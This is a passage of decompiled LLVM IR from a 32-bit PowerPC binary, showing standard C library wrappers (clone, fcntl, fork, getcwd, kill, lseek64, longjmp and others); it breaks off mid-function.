  %v2_10008780 = add i32 %v0_10008760, 32
  %v3_10008780 = inttoptr i32 %v2_10008780 to i32*
  store i32 %v0_10008780, i32* %v3_10008780, align 4
  %v0_10008788 = load i32, i32* @r20, align 4
  %v2_10008788 = add i32 %v0_10008760, 36
  %v3_10008788 = inttoptr i32 %v2_10008788 to i32*
  store i32 %v0_10008788, i32* %v3_10008788, align 4
  %v0_10008790 = load i32, i32* @r21, align 4
  %v2_10008790 = add i32 %v0_10008760, 40
  %v3_10008790 = inttoptr i32 %v2_10008790 to i32*
  store i32 %v0_10008790, i32* %v3_10008790, align 4
  %v0_10008798 = load i32, i32* @r22, align 4
  %v2_10008798 = add i32 %v0_10008760, 44
  %v3_10008798 = inttoptr i32 %v2_10008798 to i32*
  store i32 %v0_10008798, i32* %v3_10008798, align 4
  %v0_100087a0 = load i32, i32* @r23, align 4
  %v2_100087a0 = add i32 %v0_10008760, 48
  %v3_100087a0 = inttoptr i32 %v2_100087a0 to i32*
  store i32 %v0_100087a0, i32* %v3_100087a0, align 4
  %v0_100087a8 = load i32, i32* @r24, align 4
  %v2_100087a8 = add i32 %v0_10008760, 52
  %v3_100087a8 = inttoptr i32 %v2_100087a8 to i32*
  store i32 %v0_100087a8, i32* %v3_100087a8, align 4
  %v0_100087b0 = load i32, i32* @r25, align 4
  %v2_100087b0 = add i32 %v0_10008760, 56
  %v3_100087b0 = inttoptr i32 %v2_100087b0 to i32*
  store i32 %v0_100087b0, i32* %v3_100087b0, align 4
  %v0_100087b8 = load i32, i32* @r26, align 4
  %v2_100087b8 = add i32 %v0_10008760, 60
  %v3_100087b8 = inttoptr i32 %v2_100087b8 to i32*
  store i32 %v0_100087b8, i32* %v3_100087b8, align 4
  %v0_100087c0 = load i32, i32* @r27, align 4
  %v2_100087c0 = add i32 %v0_10008760, 64
  %v3_100087c0 = inttoptr i32 %v2_100087c0 to i32*
  store i32 %v0_100087c0, i32* %v3_100087c0, align 4
  %v0_100087c8 = load i32, i32* @r28, align 4
  %v2_100087c8 = add i32 %v0_10008760, 68
  %v3_100087c8 = inttoptr i32 %v2_100087c8 to i32*
  store i32 %v0_100087c8, i32* %v3_100087c8, align 4
  %v0_100087d0 = load i32, i32* @r29, align 4
  %v2_100087d0 = add i32 %v0_10008760, 72
  %v3_100087d0 = inttoptr i32 %v2_100087d0 to i32*
  store i32 %v0_100087d0, i32* %v3_100087d0, align 4
  %v0_100087d8 = load i32, i32* @r30, align 4
  %v2_100087d8 = add i32 %v0_10008760, 76
  %v3_100087d8 = inttoptr i32 %v2_100087d8 to i32*
  store i32 %v0_100087d8, i32* %v3_100087d8, align 4
  %v0_100087e0 = load i32, i32* @r31, align 4
  %v2_100087e0 = add i32 %v0_10008760, 80
  %v3_100087e0 = inttoptr i32 %v2_100087e0 to i32*
  store i32 %v0_100087e0, i32* %v3_100087e0, align 4
  %v0_100087e8 = call i32 @__sigjmp_save()
  ret i32 %v0_100087e8

; uselistorder directives
  uselistorder i32 %v0_10008760, { 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 1, 2, 3, 4, 16, 5, 17, 19, 18 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32 72, { 1, 0 }
  uselistorder i32 68, { 2, 1, 3, 4, 0 }
}

define i32 @clone(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %v0_100087f4 = load i32, i32* @r2, align 4
  %v3_100087f4 = call %1 @__asm_cror(i32 %v0_100087f4, i32 %arg4, i32 %v0_100087f4)
  %v6_100087f4 = extractvalue %1 %v3_100087f4, 2
  br i1 %v6_100087f4, label %dec_label_pc_10008858, label %dec_label_pc_100087fc

dec_label_pc_100087fc:                            ; preds = %entry
  %v1_10008804 = call i32 @__asm_rlwinm(i32 %arg2, i32 0, i32 0, i32 27)
  %v2_1000880c = add i32 %v1_10008804, -16
  %v3_1000880c = inttoptr i32 %v2_1000880c to i32*
  store i32 0, i32* %v3_1000880c, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 %v2_1000880c, i32* @r30, align 4
  store i32 %arg4, i32* @r31, align 4
  store i32 %arg3, i32* @r3, align 4
  %v3_10008828 = icmp eq i32 %arg3, 0
  %v3_1000882c = call %2 @__asm_crandc(i32 %arg4, i32 %arg4, i32 %arg3)
  %v7_1000882c = extractvalue %2 %v3_1000882c, 3
  br i1 %v3_10008828, label %dec_label_pc_10008834, label %dec_label_pc_10008848

dec_label_pc_10008834:                            ; preds = %dec_label_pc_100087fc
  %v0_10008838 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000883c = load i32, i32* @r31, align 4
  call void @__pseudo_call(i32 %v0_10008838)
  %v1_10008844 = call i32 @__GI__exit(i32 %v0_1000883c)
  store i32 %v1_10008844, i32* @r3, align 4
  %v1_10008850.pre = load i1, i1* @cr0_so, align 1
  br label %dec_label_pc_10008848

dec_label_pc_10008848:                            ; preds = %dec_label_pc_100087fc, %dec_label_pc_10008834
  %v1_10008850 = phi i1 [ %v7_1000882c, %dec_label_pc_100087fc ], [ %v1_10008850.pre, %dec_label_pc_10008834 ]
  %v2_10008850 = xor i1 %v1_10008850, true
  call void @__pseudo_cond_branch(i1 %v2_10008850, i32 ptrtoint (i32* @global_var_10008844.271 to i32))
  %v0_10008854 = call i32 @__syscall_error()
  br label %dec_label_pc_10008858

dec_label_pc_10008858:                            ; preds = %entry, %dec_label_pc_10008848
  store i32 22, i32* @r3, align 4
  %v0_1000885c = call i32 @__syscall_error()
  ret i32 %v0_1000885c

; uselistorder directives
  uselistorder i32* @r2, { 32, 36, 56, 21, 57, 13, 50, 44, 43, 0, 14, 15, 16, 1, 2, 3, 4, 17, 18, 5, 19, 20, 22, 23, 45, 46, 58, 59, 48, 49, 24, 25, 6, 7, 26, 27, 51, 53, 54, 8, 42, 28, 29, 40, 41, 39, 60, 61, 62, 55, 52, 30, 47, 9, 10, 11, 12, 31, 65, 33, 34, 37, 35, 38, 64, 63 }
  uselistorder i32 %arg4, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10008858, { 1, 0 }
  uselistorder label %dec_label_pc_10008848, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_10008874 = add i32 %arg2, -12
  %v2_10008878 = icmp ugt i32 %v1_10008874, 2
  %v2_10008880 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10008880, i32* %stack_var_-32, align 4
  br i1 %v2_10008878, label %dec_label_pc_100088ac, label %dec_label_pc_1000889c

dec_label_pc_1000889c:                            ; preds = %entry
  store i32 268470436, i32* @lr, align 4
  %v2_100088a0 = call i32 @__GI_fcntl64(i32 3)
  store i32 %v2_100088a0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100088cc

dec_label_pc_100088ac:                            ; preds = %entry
  %v0_100088b0 = call i32 @__asm_mfcr()
  %v1_100088b4 = and i32 %v0_100088b0, 268435456
  %v3_100088b4 = icmp eq i32 %v1_100088b4, 0
  store i32 %v0_100088b0, i32* %r31.global-to-local, align 4
  br i1 %v3_100088b4, label %dec_label_pc_100088cc, label %dec_label_pc_100088c0

dec_label_pc_100088c0:                            ; preds = %dec_label_pc_100088ac
  %v0_100088c0 = call i32 @__errno_location()
  %v0_100088c4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100088c4 = inttoptr i32 %v0_100088c0 to i32*
  store i32 %v0_100088c4, i32* %v2_100088c4, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100088cc

dec_label_pc_100088cc:                            ; preds = %dec_label_pc_100088ac, %dec_label_pc_1000889c, %dec_label_pc_100088c0
  %v0_100088d0 = phi i32 [ %v0_100088b0, %dec_label_pc_100088ac ], [ %v2_100088a0, %dec_label_pc_1000889c ], [ -1, %dec_label_pc_100088c0 ]
  ret i32 %v0_100088d0

; uselistorder directives
  uselistorder label %dec_label_pc_100088cc, { 2, 0, 1 }
}

define i32 @__GI_fcntl64(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_100088fc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100088fc, i32* %stack_var_-32, align 4
  %v0_10008918 = call i32 @__asm_mfcr()
  %v1_1000891c = and i32 %v0_10008918, 268435456
  %v3_1000891c = icmp eq i32 %v1_1000891c, 0
  store i32 %v0_10008918, i32* %r31.global-to-local, align 4
  br i1 %v3_1000891c, label %dec_label_pc_10008934, label %dec_label_pc_10008928

dec_label_pc_10008928:                            ; preds = %entry
  %v0_10008928 = call i32 @__errno_location()
  %v0_1000892c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000892c = inttoptr i32 %v0_10008928 to i32*
  store i32 %v0_1000892c, i32* %v2_1000892c, align 4
  br label %dec_label_pc_10008934

dec_label_pc_10008934:                            ; preds = %entry, %dec_label_pc_10008928
  %v0_10008944 = phi i32 [ %v0_10008918, %entry ], [ -1, %dec_label_pc_10008928 ]
  ret i32 %v0_10008944

; uselistorder directives
  uselistorder label %dec_label_pc_10008934, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_1000895c

dec_label_pc_1000895c:                            ; preds = %dec_label_pc_1000895c.backedge, %entry
  %v0_10008968 = call i32 @__asm_mfcr()
  %v1_1000896c = and i32 %v0_10008968, 268435456
  %v3_1000896c = icmp eq i32 %v1_1000896c, 0
  store i32 %v0_10008968, i32* %r31.global-to-local, align 4
  br i1 %v3_1000896c, label %dec_label_pc_1000895c.backedge, label %dec_label_pc_10008978

dec_label_pc_10008978:                            ; preds = %dec_label_pc_1000895c
  %v0_10008978 = call i32 @__errno_location()
  %v0_1000897c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000897c = inttoptr i32 %v0_10008978 to i32*
  store i32 %v0_1000897c, i32* %v2_1000897c, align 4
  br label %dec_label_pc_1000895c.backedge

dec_label_pc_1000895c.backedge:                   ; preds = %dec_label_pc_10008978, %dec_label_pc_1000895c
  br label %dec_label_pc_1000895c
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000899c = call i32 @__asm_mfcr()
  %v1_100089a0 = and i32 %v0_1000899c, 268435456
  %v3_100089a0 = icmp eq i32 %v1_100089a0, 0
  store i32 %v0_1000899c, i32* %r31.global-to-local, align 4
  br i1 %v3_100089a0, label %dec_label_pc_100089b8, label %dec_label_pc_100089ac

dec_label_pc_100089ac:                            ; preds = %entry
  %v0_100089ac = call i32 @__errno_location()
  %v0_100089b0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100089b0 = inttoptr i32 %v0_100089ac to i32*
  store i32 %v0_100089b0, i32* %v2_100089b0, align 4
  br label %dec_label_pc_100089b8

dec_label_pc_100089b8:                            ; preds = %entry, %dec_label_pc_100089ac
  %v0_100089c8 = phi i32 [ %v0_1000899c, %entry ], [ -1, %dec_label_pc_100089ac ]
  ret i32 %v0_100089c8

; uselistorder directives
  uselistorder label %dec_label_pc_100089b8, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100089e4 = call i32 @__asm_mfcr()
  %v1_100089e8 = and i32 %v0_100089e4, 268435456
  %v3_100089e8 = icmp eq i32 %v1_100089e8, 0
  store i32 %v0_100089e4, i32* %r31.global-to-local, align 4
  br i1 %v3_100089e8, label %dec_label_pc_10008a00, label %dec_label_pc_100089f4

dec_label_pc_100089f4:                            ; preds = %entry
  %v0_100089f4 = call i32 @__errno_location()
  %v0_100089f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100089f8 = inttoptr i32 %v0_100089f4 to i32*
  store i32 %v0_100089f8, i32* %v2_100089f8, align 4
  br label %dec_label_pc_10008a00

dec_label_pc_10008a00:                            ; preds = %entry, %dec_label_pc_100089f4
  %v0_10008a10 = phi i32 [ %v0_100089e4, %entry ], [ -1, %dec_label_pc_100089f4 ]
  ret i32 %v0_10008a10

; uselistorder directives
  uselistorder label %dec_label_pc_10008a00, { 1, 0 }
}

define i32 @__libc_fsync(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008a2c = call i32 @__asm_mfcr()
  %v1_10008a30 = and i32 %v0_10008a2c, 268435456
  %v3_10008a30 = icmp eq i32 %v1_10008a30, 0
  store i32 %v0_10008a2c, i32* %r31.global-to-local, align 4
  br i1 %v3_10008a30, label %dec_label_pc_10008a48, label %dec_label_pc_10008a3c

dec_label_pc_10008a3c:                            ; preds = %entry
  %v0_10008a3c = call i32 @__errno_location()
  %v0_10008a40 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008a40 = inttoptr i32 %v0_10008a3c to i32*
  store i32 %v0_10008a40, i32* %v2_10008a40, align 4
  br label %dec_label_pc_10008a48

dec_label_pc_10008a48:                            ; preds = %entry, %dec_label_pc_10008a3c
  %v0_10008a58 = phi i32 [ %v0_10008a2c, %entry ], [ -1, %dec_label_pc_10008a3c ]
  ret i32 %v0_10008a58

; uselistorder directives
  uselistorder label %dec_label_pc_10008a48, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v3_10008a68 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r30, align 4
  %v3_10008a78 = icmp eq i32 %arg1, 0
  br i1 %v3_10008a68, label %dec_label_pc_10008a78, label %dec_label_pc_10008aac

dec_label_pc_10008a78:                            ; preds = %entry
  br i1 %v3_10008a78, label %dec_label_pc_10008a94, label %dec_label_pc_10008a80

dec_label_pc_10008a80:                            ; preds = %dec_label_pc_10008a78
  %v0_10008a80 = call i32 @__errno_location()
  store i32 0, i32* @r30, align 4
  %v2_10008a8c = inttoptr i32 %v0_10008a80 to i32*
  store i32 22, i32* %v2_10008a8c, align 4
  br label %dec_label_pc_10008b44

dec_label_pc_10008a94:                            ; preds = %dec_label_pc_10008a78
  store i32 268470936, i32* @lr, align 4
  %v0_10008a94 = call i32 @__GI_getpagesize()
  %v1_10008a98 = icmp slt i32 %v0_10008a94, 4096
  %v0_10008a9c. = select i1 %v1_10008a98, i32 4096, i32 %v0_10008a94
  store i32 %v0_10008a9c., i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008abc

dec_label_pc_10008aac:                            ; preds = %entry
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  br i1 %v3_10008a78, label %dec_label_pc_10008abc, label %dec_label_pc_10008acc

dec_label_pc_10008abc:                            ; preds = %dec_label_pc_10008a94, %dec_label_pc_10008aac
  %v0_10008abc = phi i32 [ %v0_10008a9c., %dec_label_pc_10008a94 ], [ %arg2, %dec_label_pc_10008aac ]
  store i32 %v0_10008abc, i32* @r3, align 4
  store i32 268470980, i32* @lr, align 4
  %v0_10008ac0 = call i32 @malloc()
  store i32 %v0_10008ac0, i32* @r29, align 4
  %v3_10008ac4 = icmp eq i32 %v0_10008ac0, 0
  br i1 %v3_10008ac4, label %dec_label_pc_10008b40, label %dec_label_pc_10008abc.dec_label_pc_10008acc_crit_edge

dec_label_pc_10008abc.dec_label_pc_10008acc_crit_edge: ; preds = %dec_label_pc_10008abc
  br label %dec_label_pc_10008acc

dec_label_pc_10008acc:                            ; preds = %dec_label_pc_10008abc.dec_label_pc_10008acc_crit_edge, %dec_label_pc_10008aac
  %v0_10008adc = call i32 @__asm_mfcr()
  %v1_10008ae0 = and i32 %v0_10008adc, 268435456
  store i32 %v1_10008ae0, i32* @r9, align 4
  %v3_10008ae0 = icmp eq i32 %v1_10008ae0, 0
  store i32 %v0_10008adc, i32* %r31.global-to-local, align 4
  store i32 %v0_10008adc, i32* @r4, align 4
  br i1 %v3_10008ae0, label %dec_label_pc_10008afc, label %dec_label_pc_10008af0

dec_label_pc_10008af0:                            ; preds = %dec_label_pc_10008acc
  %v0_10008af0 = call i32 @__errno_location()
  store i32 -1, i32* @r4, align 4
  %v0_10008af8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008af8 = inttoptr i32 %v0_10008af0 to i32*
  store i32 %v0_10008af8, i32* %v2_10008af8, align 4
  %v0_10008afc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10008afc

dec_label_pc_10008afc:                            ; preds = %dec_label_pc_10008acc, %dec_label_pc_10008af0
  %v0_10008afc = phi i32 [ %v0_10008adc, %dec_label_pc_10008acc ], [ %v0_10008afc.pre, %dec_label_pc_10008af0 ]
  %v1_10008afc = icmp slt i32 %v0_10008afc, 0
  %v0_10008b00 = load i32, i32* @r30, align 4
  %v3_10008b00 = icmp eq i32 %v0_10008b00, 0
  br i1 %v1_10008afc, label %dec_label_pc_10008b30, label %dec_label_pc_10008b08

dec_label_pc_10008b08:                            ; preds = %dec_label_pc_10008afc
  br i1 %v3_10008b00, label %dec_label_pc_10008b0c, label %dec_label_pc_10008b20.thread8

dec_label_pc_10008b20.thread8:                    ; preds = %dec_label_pc_10008b08
  br label %dec_label_pc_10008b44

dec_label_pc_10008b0c:                            ; preds = %dec_label_pc_10008b08
  %v0_10008b0c = load i32, i32* @r28, align 4
  %v3_10008b0c = icmp eq i32 %v0_10008b0c, 0
  br i1 %v3_10008b0c, label %dec_label_pc_10008b20, label %dec_label_pc_10008b20.thread

dec_label_pc_10008b20.thread:                     ; preds = %dec_label_pc_10008b0c
  br label %dec_label_pc_10008b28

dec_label_pc_10008b20:                            ; preds = %dec_label_pc_10008b0c
  %v0_10008b14 = load i32, i32* @r29, align 4
  store i32 268471068, i32* @lr, align 4
  %v1_10008b18 = call i32 @realloc(i32 %v0_10008b14)
  store i32 %v1_10008b18, i32* @r30, align 4
  %v3_10008b20 = icmp eq i32 %v1_10008b18, 0
  br i1 %v3_10008b20, label %dec_label_pc_10008b28, label %dec_label_pc_10008b44

dec_label_pc_10008b28:                            ; preds = %dec_label_pc_10008b20.thread, %dec_label_pc_10008b20
  %v0_10008b28 = load i32, i32* @r29, align 4
  store i32 %v0_10008b28, i32* @r30, align 4
  br label %dec_label_pc_10008b44

dec_label_pc_10008b30:                            ; preds = %dec_label_pc_10008afc
  br i1 %v3_10008b00, label %dec_label_pc_10008b34, label %dec_label_pc_10008b40

dec_label_pc_10008b34:                            ; preds = %dec_label_pc_10008b30
  %v0_10008b34 = load i32, i32* @r29, align 4
  store i32 %v0_10008b34, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10008b3c.272 to i32), i32* @lr, align 4
  %v0_10008b38 = call i32 @free()
  br label %dec_label_pc_10008b44

dec_label_pc_10008b40:                            ; preds = %dec_label_pc_10008b30, %dec_label_pc_10008abc
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_10008b44

dec_label_pc_10008b44:                            ; preds = %dec_label_pc_10008b20.thread8, %dec_label_pc_10008b20, %dec_label_pc_10008b34, %dec_label_pc_10008b28, %dec_label_pc_10008a80, %dec_label_pc_10008b40
  %v0_10008b48 = load i32, i32* @r30, align 4
  ret i32 %v0_10008b48

; uselistorder directives
  uselistorder i32 %v0_10008adc, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__GI_getpagesize, { 0, 4, 3, 2, 1 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10008b44, { 5, 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_10008b28, { 1, 0 }
  uselistorder label %dec_label_pc_10008afc, { 1, 0 }
  uselistorder label %dec_label_pc_10008abc, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008b74 = call i32 @__asm_mfcr()
  %v1_10008b78 = and i32 %v0_10008b74, 268435456
  %v3_10008b78 = icmp eq i32 %v1_10008b78, 0
  store i32 %v0_10008b74, i32* %r31.global-to-local, align 4
  br i1 %v3_10008b78, label %dec_label_pc_10008b90, label %dec_label_pc_10008b84

dec_label_pc_10008b84:                            ; preds = %entry
  %v0_10008b84 = call i32 @__errno_location()
  %v0_10008b88 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008b88 = inttoptr i32 %v0_10008b84 to i32*
  store i32 %v0_10008b88, i32* %v2_10008b88, align 4
  br label %dec_label_pc_10008b90

dec_label_pc_10008b90:                            ; preds = %entry, %dec_label_pc_10008b84
  %v0_10008ba0 = phi i32 [ %v0_10008b74, %entry ], [ -1, %dec_label_pc_10008b84 ]
  ret i32 %v0_10008ba0

; uselistorder directives
  uselistorder label %dec_label_pc_10008b90, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v3_10008bac = load i32, i32* @global_var_1002c39c.149, align 4
  %v3_10008bb0 = icmp eq i32 %v3_10008bac, 0
  %v0_10008bb4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10008bb0, i32 %v0_10008bb4)
  ret i32 %v3_10008bac
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008bd8 = call i32 @__asm_mfcr()
  %v1_10008bdc = and i32 %v0_10008bd8, 268435456
  %v3_10008bdc = icmp eq i32 %v1_10008bdc, 0
  store i32 %v0_10008bd8, i32* %r31.global-to-local, align 4
  br i1 %v3_10008bdc, label %dec_label_pc_10008bf4, label %dec_label_pc_10008be8

dec_label_pc_10008be8:                            ; preds = %entry
  %v0_10008be8 = call i32 @__errno_location()
  %v0_10008bec = load i32, i32* %r31.global-to-local, align 4
  %v2_10008bec = inttoptr i32 %v0_10008be8 to i32*
  store i32 %v0_10008bec, i32* %v2_10008bec, align 4
  br label %dec_label_pc_10008bf4

dec_label_pc_10008bf4:                            ; preds = %entry, %dec_label_pc_10008be8
  %v0_10008c04 = phi i32 [ %v0_10008bd8, %entry ], [ -1, %dec_label_pc_10008be8 ]
  ret i32 %v0_10008c04

; uselistorder directives
  uselistorder label %dec_label_pc_10008bf4, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008c20 = call i32 @__asm_mfcr()
  %v1_10008c24 = and i32 %v0_10008c20, 268435456
  %v3_10008c24 = icmp eq i32 %v1_10008c24, 0
  store i32 %v0_10008c20, i32* %r31.global-to-local, align 4
  br i1 %v3_10008c24, label %dec_label_pc_10008c3c, label %dec_label_pc_10008c30

dec_label_pc_10008c30:                            ; preds = %entry
  %v0_10008c30 = call i32 @__errno_location()
  %v0_10008c34 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008c34 = inttoptr i32 %v0_10008c30 to i32*
  store i32 %v0_10008c34, i32* %v2_10008c34, align 4
  br label %dec_label_pc_10008c3c

dec_label_pc_10008c3c:                            ; preds = %entry, %dec_label_pc_10008c30
  %v0_10008c4c = phi i32 [ %v0_10008c20, %entry ], [ -1, %dec_label_pc_10008c30 ]
  ret i32 %v0_10008c4c

; uselistorder directives
  uselistorder label %dec_label_pc_10008c3c, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008c68 = call i32 @__asm_mfcr()
  %v1_10008c6c = and i32 %v0_10008c68, 268435456
  %v3_10008c6c = icmp eq i32 %v1_10008c6c, 0
  store i32 %v0_10008c68, i32* %r31.global-to-local, align 4
  br i1 %v3_10008c6c, label %dec_label_pc_10008c84, label %dec_label_pc_10008c78

dec_label_pc_10008c78:                            ; preds = %entry
  %v0_10008c78 = call i32 @__errno_location()
  %v0_10008c7c = load i32, i32* %r31.global-to-local, align 4
  %v2_10008c7c = inttoptr i32 %v0_10008c78 to i32*
  store i32 %v0_10008c7c, i32* %v2_10008c7c, align 4
  br label %dec_label_pc_10008c84

dec_label_pc_10008c84:                            ; preds = %entry, %dec_label_pc_10008c78
  %v0_10008c94 = phi i32 [ %v0_10008c68, %entry ], [ -1, %dec_label_pc_10008c78 ]
  ret i32 %v0_10008c94

; uselistorder directives
  uselistorder label %dec_label_pc_10008c84, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008cb0 = call i32 @__asm_mfcr()
  %v1_10008cb4 = and i32 %v0_10008cb0, 268435456
  %v3_10008cb4 = icmp eq i32 %v1_10008cb4, 0
  store i32 %v0_10008cb0, i32* %r31.global-to-local, align 4
  br i1 %v3_10008cb4, label %dec_label_pc_10008ccc, label %dec_label_pc_10008cc0

dec_label_pc_10008cc0:                            ; preds = %entry
  %v0_10008cc0 = call i32 @__errno_location()
  %v0_10008cc4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008cc4 = inttoptr i32 %v0_10008cc0 to i32*
  store i32 %v0_10008cc4, i32* %v2_10008cc4, align 4
  br label %dec_label_pc_10008ccc

dec_label_pc_10008ccc:                            ; preds = %entry, %dec_label_pc_10008cc0
  %v0_10008cdc = phi i32 [ %v0_10008cb0, %entry ], [ -1, %dec_label_pc_10008cc0 ]
  ret i32 %v0_10008cdc

; uselistorder directives
  uselistorder label %dec_label_pc_10008ccc, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008cf8 = call i32 @__asm_mfcr()
  %v1_10008cfc = and i32 %v0_10008cf8, 268435456
  store i32 %v1_10008cfc, i32* @r9, align 4
  %v3_10008cfc = icmp eq i32 %v1_10008cfc, 0
  store i32 %v0_10008cf8, i32* %r31.global-to-local, align 4
  br i1 %v3_10008cfc, label %dec_label_pc_10008d14, label %dec_label_pc_10008d08

dec_label_pc_10008d08:                            ; preds = %entry
  %v0_10008d08 = call i32 @__errno_location()
  %v0_10008d0c = load i32, i32* %r31.global-to-local, align 4
  %v2_10008d0c = inttoptr i32 %v0_10008d08 to i32*
  store i32 %v0_10008d0c, i32* %v2_10008d0c, align 4
  br label %dec_label_pc_10008d14

dec_label_pc_10008d14:                            ; preds = %entry, %dec_label_pc_10008d08
  %v0_10008d24 = phi i32 [ %v0_10008cf8, %entry ], [ -1, %dec_label_pc_10008d08 ]
  ret i32 %v0_10008d24

; uselistorder directives
  uselistorder label %dec_label_pc_10008d14, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10008d28 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r10, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_10008d54 = call i32 @__asm_mfcr()
  %v1_10008d58 = and i32 %v0_10008d54, 268435456
  %v3_10008d58 = icmp eq i32 %v1_10008d58, 0
  store i32 %v0_10008d54, i32* %r31.global-to-local, align 4
  store i32 %v0_10008d54, i32* %r0.global-to-local, align 4
  br i1 %v3_10008d58, label %dec_label_pc_10008d7c, label %dec_label_pc_10008d6c

dec_label_pc_10008d6c:                            ; preds = %entry
  %v0_10008d6c = call i32 @__errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_10008d74 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008d74 = inttoptr i32 %v0_10008d6c to i32*
  store i32 %v0_10008d74, i32* %v2_10008d74, align 4
  %v0_10008d80.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008d80

dec_label_pc_10008d7c:                            ; preds = %entry
  %v3_10008d64 = icmp eq i32 %v0_10008d54, 0
  br i1 %v3_10008d64, label %dec_label_pc_10008d8c, label %dec_label_pc_10008d80

dec_label_pc_10008d80:                            ; preds = %dec_label_pc_10008d7c, %dec_label_pc_10008d6c
  %v0_10008d80 = phi i32 [ %v0_10008d54, %dec_label_pc_10008d7c ], [ %v0_10008d80.pre, %dec_label_pc_10008d6c ]
  store i32 %v0_10008d80, i32* @r4, align 4
  %tmp = icmp slt i32 %v0_10008d80, 0
  %v1_10008d84 = zext i1 %tmp to i32
  %v2_10008d84 = ashr i32 %v0_10008d80, 31
  %v3_10008d84 = and i32 %v2_10008d84, -2
  %v4_10008d84 = or i32 %v3_10008d84, %v1_10008d84
  br label %dec_label_pc_10008d94

dec_label_pc_10008d8c:                            ; preds = %dec_label_pc_10008d7c
  %v3_10008d8c = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10008d94

dec_label_pc_10008d94:                            ; preds = %dec_label_pc_10008d80, %dec_label_pc_10008d8c
  %v0_10008da4 = phi i32 [ %v4_10008d84, %dec_label_pc_10008d80 ], [ %v3_10008d8c, %dec_label_pc_10008d8c ]
  store i32 %v0_10008d28, i32* %r0.global-to-local, align 4
  ret i32 %v0_10008da4

; uselistorder directives
  uselistorder i32 %v0_10008d80, { 2, 0, 1 }
  uselistorder i32 %v0_10008d54, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_10008d94, { 1, 0 }
}

define i32 @_longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 %arg2, i32* @r31, align 4
  %v1_10008dc0 = add i32 %arg1, 448
  %v2_10008dc0 = inttoptr i32 %v1_10008dc0 to i32*
